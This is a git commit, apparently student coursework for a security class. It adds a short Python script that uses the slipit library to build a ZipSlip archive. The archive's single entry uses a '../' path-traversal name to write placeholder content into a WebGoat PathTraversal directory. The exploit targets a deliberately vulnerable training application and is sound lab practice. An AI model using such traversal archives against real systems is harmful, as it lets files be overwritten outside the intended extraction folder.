6890a6f033299108ec63123776e77b95c6128e2c
ecschoye <ecschoye@stud.ntnu.no>
2023-09-01 10:35:54 +0200

    idatt2503 files so far

---
+++ zipslip/main.py
@@ -0,0 +1,17 @@
+from slipit.provider.zip_provider import ZipProvider
+
+# Create a SlipIt instance
+archive_name = 'malicious.zip'
+s = ZipProvider.create(archive_name)
+
+# Define the content you want to place in the ZIP archive
+malicious_content = b'Your malicious content goes here'
+
+# Define the path inside the ZIP archive to exploit ZipSlip
+exploit_path = '../../../../../../../../../home/webgoat/.webgoat-2023.4/PathTraversal/ecschoye/ecschoye.jpg'
+
+# Add the malicious content to the ZIP archive with the exploit path
+s.append_blob(malicious_content, exploit_path)
+
+# Close the ZIP archive
+s.close_archive()
